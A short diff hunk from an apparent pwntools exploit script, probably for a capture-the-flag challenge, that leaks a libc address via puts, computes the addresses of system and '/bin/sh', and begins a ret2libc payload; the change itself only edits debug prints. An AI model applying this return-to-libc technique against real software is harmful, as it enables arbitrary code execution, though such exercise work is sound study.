@@ -69,14 +69,15 @@ io.sendlineafter(b"> ", payload)
 io.recvline()
 io.recvline()
 leak = io.recvline().strip()
-print(hex(u64(leak.ljust(8, b"\x00"))), leak)
+
+print("puts", hex(u64(leak.ljust(8, b"\x00"))), leak) # puts
 
 print(hex(u64(leak.ljust(8, b"\x00")) - putslibc))
 
 systemAddr = (u64(leak.ljust(8, b"\x00")) - putslibc) + system
 binshAddr = (u64(leak.ljust(8, b"\x00")) - putslibc) + binsh
 
-print(p64(binshAddr), hex(binshAddr))
+print(p64(binshAddr), hex(systemAddr))
 
 payload = flat(
     padding, adjust,
